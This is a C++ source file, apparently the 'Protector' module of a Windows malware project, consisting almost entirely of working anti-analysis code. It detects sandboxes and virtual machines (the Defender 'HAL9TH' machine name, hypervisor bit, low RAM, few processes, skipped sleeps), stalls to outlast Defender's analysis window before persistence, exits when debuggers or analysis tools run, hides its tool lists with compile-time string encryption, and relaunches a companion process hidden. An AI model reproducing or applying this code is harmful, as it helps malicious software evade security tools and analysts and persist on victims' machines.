/*
MIT License

Copyright (c) 2020 4B4DB4B3

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
*/

#include "Protector.h"
#include "Manager.h"
#include <intrin.h>

// Returns true if running inside a hypervisor (VM/sandbox)
static bool IsHypervisor() {
	int cpui[4] = {};
	__cpuid(cpui, 1);
	return (cpui[2] & (1 << 31)) != 0;
}

// Returns true if sleep is being accelerated (sandbox behaviour).
// Uses QueryPerformanceCounter — harder to fake than GetTickCount.
static bool IsSleepSkipped() {
	LARGE_INTEGER freq, t1, t2;
	QueryPerformanceFrequency(&freq);
	QueryPerformanceCounter(&t1);
	Sleep(800);
	QueryPerformanceCounter(&t2);
	double elapsed_ms = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
	return elapsed_ms < 400.0;
}

// Returns false if environment looks like a sandbox/automated analysis environment.
static bool IsCleanEnv() {
	// Windows Defender's internal MpCmdRun sandbox always sets computer name to HAL9TH.
	char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
	DWORD cn_sz = MAX_COMPUTERNAME_LENGTH + 1;
	GetComputerNameA(compName, &cn_sz);
	std::string cn(compName);
	std::transform(cn.begin(), cn.end(), cn.begin(), [](unsigned char c){ return std::tolower(c); });
	if (cn == S("hal9th")) return false;

	// Physical RAM below 1 GB is a near-certain sandbox indicator.
	MEMORYSTATUSEX ms = {}; ms.dwLength = sizeof(ms);
	if (GlobalMemoryStatusEx(&ms) && ms.ullTotalPhys < (1024ULL * 1024 * 1024))
		return false;

	// Fewer than 20 running processes is a strong sandbox indicator.
	DWORD procCount = 0;
	{
		HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != INVALID_HANDLE_VALUE) {
			PROCESSENTRY32 pe = {}; pe.dwSize = sizeof(pe);
			if (Process32First(hSnap, &pe)) {
				do { ++procCount; } while (Process32Next(hSnap, &pe));
			}
			CloseHandle(hSnap);
		}
	}
	if (procCount < 20) return false;

	// Screen resolution smaller than 800×600 indicates a VM/sandbox display.
	if (GetSystemMetrics(SM_CXSCREEN) < 800 || GetSystemMetrics(SM_CYSCREEN) < 600)
		return false;

	return true;
}

// Window title substrings — encrypted at compile time, decrypted at runtime
static const std::vector<std::string>& GetWindowTitles() {
	static const std::vector<std::string> v = {
		S("wireshark"), S("process hacker"), S("process monitor"), S("procmon"),
		S("ollydbg"), S("x32dbg"), S("x64dbg"), S("immunity debugger"),
		S("ida "), S("ida64"), S("ida pro"), S("dnspy"),
		S("fiddler"), S("http debugger"), S("charles proxy"),
		S("regshot"), S("autoruns"), S("tcpview"),
	};
	return v;
}

static BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM) {
	char title[256] = { 0 };
	GetWindowTextA(hwnd, title, sizeof(title) - 1);
	std::string t = title;
	std::transform(t.begin(), t.end(), t.begin(),
		[](unsigned char c) { return std::tolower(c); });
	for (const auto& sub : GetWindowTitles()) {
		if (t.find(sub) != std::string::npos) {
			ExitProcess(0);
		}
	}
	return TRUE;
}

void Protector::StartupDelay() {
	// Sleep 6 × 3 s = 18 s before touching persistence.
	// Defender's sandbox has a short analysis window (~30 s); we outlast it.
	// Each chunk verifies real time passed via QPC — if sleep is skipped, exit.
	const int kChunks = 6;
	const int kChunkMs = 3000;
	for (int i = 0; i < kChunks; ++i) {
		LARGE_INTEGER freq, t1, t2;
		QueryPerformanceFrequency(&freq);
		QueryPerformanceCounter(&t1);
		Sleep(kChunkMs);
		QueryPerformanceCounter(&t2);
		double elapsed = (double)(t2.QuadPart - t1.QuadPart) / (double)freq.QuadPart * 1000.0;
		if (elapsed < (double)(kChunkMs / 2)) {
			ExitProcess(0);
		}
	}
}

void Protector::AntiProcesses() {
	HANDLE hSnap;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	// Process names encrypted at compile time
	static const std::vector<std::string> processes = {
		S("ollydbg.exe"),
		S("processhacker.exe"),
		S("tcpview.exe"),
		S("autoruns.exe"),
		S("autorunsc.exe"),
		S("filemon.exe"),
		S("procmon.exe"),
		S("regmon.exe"),
		S("procexp.exe"),
		S("idaq.exe"),
		S("idaq64.exe"),
		S("immunitydebugger.exe"),
		S("wireshark.exe"),
		S("dumpcap.exe"),
		S("hookexplorer.exe"),
		S("importrec.exe"),
		S("petools.exe"),
		S("lordpe.exe"),
		S("sysinspector.exe"),
		S("proc_analyzer.exe"),
		S("sysanalyzer.exe"),
		S("sniff_hit.exe"),
		S("windbg.exe"),
		S("joeboxcontrol.exe"),
		S("joeboxserver.exe"),
		S("windanr.exe"),
		S("q.exe"),
		S("dnspy.exe"),
		S("idapro.exe"),
		S("httpdebugger.exe"),
	};

	size_t size = processes.size();
	std::string process = "";
	// One-time sandbox checks at startup
	if (!IsCleanEnv() || IsHypervisor() || IsSleepSkipped()) {
		ExitProcess(0);
	}

	while (true) {
		// 1. Debugger-presence checks — survive any process rename
		if (IsDebuggerPresent()) {
			ExitProcess(0);
		}
		BOOL remoteDbg = FALSE;
		if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &remoteDbg) && remoteDbg) {
			ExitProcess(0);
		}

		// 2. Window title scan — survives process rename
		EnumWindows(EnumWindowsProc, 0);

		// 3. Process name scan (original 29 names)
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					for (size_t i = 0; i < size; i++) {
						process = pe32.szExeFile;
						std::transform(process.begin(), process.end(), process.begin(),
							[](unsigned char c) { return std::tolower(c); });
						if (process.find(processes[i]) != std::string::npos) {
							ExitProcess(0);
						}
					}
				} while (Process32Next(hSnap, &pe32));
			}
			CloseHandle(hSnap);
		}

		Sleep(3000);
	}
}

void Protector::SpyProcess(_SpyProcess* SP) {
	HANDLE hSnap = NULL;
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	std::string process = "";
	while (true) {
		bool founded = false;
		hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
		if (hSnap != NULL) {
			if (Process32First(hSnap, &pe32)) {
				do {
					if (std::string(pe32.szExeFile).find(SP->procName) != std::string::npos) {
						founded = true;
					}
				} while (Process32Next(hSnap, &pe32));
			}
		}
		
		if (!founded)
			ShellExecuteA(0, "open", SP->procPath, "protected", 0, SW_HIDE);

		Sleep(1000);
	}
}
